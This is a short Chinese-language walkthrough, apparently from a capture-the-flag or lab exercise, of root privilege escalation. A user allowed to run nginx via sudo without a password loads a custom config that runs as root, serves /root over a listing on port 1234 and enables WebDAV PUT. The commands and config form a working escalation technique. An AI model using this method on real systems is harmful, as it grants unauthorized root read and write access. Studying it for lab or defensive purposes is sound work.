提权

查看当前用户可以进行提权的方法

john@webmaster:~$ sudo -l
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

发现可以使用nginx进行提取，上网搜集提取方案

在本地写一个conf文件用与进行提权
john@webmaster:~$ sudo /usr/sbin/nginx -c /home/john/a.conf
john@webmaster:~$ cat a.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1234;
                root /root;
                autoindex on;
                dav_methods PUT;
        }
}
自己写的conf文件，在利用时需是绝对路径，否则会是下面的问题
john@webmaster:~$ sudo /usr/sbin/nginx -c ./a.conf
nginx: [emerg] open() "/usr/share/nginx/./a.conf" failed (2: No such file or directory)
